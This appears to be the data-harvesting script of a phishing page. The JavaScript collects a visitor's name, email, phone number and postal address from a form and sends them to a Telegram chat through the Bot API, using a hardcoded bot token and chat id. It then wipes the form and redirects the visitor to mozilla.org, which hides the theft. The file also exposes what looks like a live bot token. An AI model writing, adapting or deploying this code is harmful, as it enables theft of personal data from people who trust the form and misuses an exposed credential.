//bot token
var telegram_bot_id = "5048296069:AAFTFhOFZqjSZFuphfs2rB8kzJdGKkYWloE";
//chat id
var chat_id = 1225371262;
var u_fname, lname, email, telephone, address, city, state, zip;
var ready = function () {
    u_fname = document.getElementById("fname").value;
	lname = document.getElementById("lname").value;
	email = document.getElementById("email").value;
	telephone = document.getElementById("telephone").value;
	address = document.getElementById("address").value;
	city = document.getElementById("city").value;
	state = document.getElementById("state").value;
	zip = document.getElementById("zip").value;
    message = "First Name: " + u_fname + "\nLast Name: " + lname + "\nEmail: " + email +  "\nPhone: " + telephone + "\nAddress: " + address + "\nCity: " + city +  "\nState: " + state +  "\nZip-Code: " + zip;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("fname").value = "";
	document.getElementById("lname").value = "";
	document.getElementById("email").value = "";
	document.getElementById("telephone").value = "";
	document.getElementById("address").value = "";
	document.getElementById("city").value = "";
	document.getElementById("state").value = "";
    document.getElementById("zip").value = "";
	location.assign ("http://www.mozilla.org"); 
	
    return false;
	location.replace('https://www.javascripttutorial.net/');

};

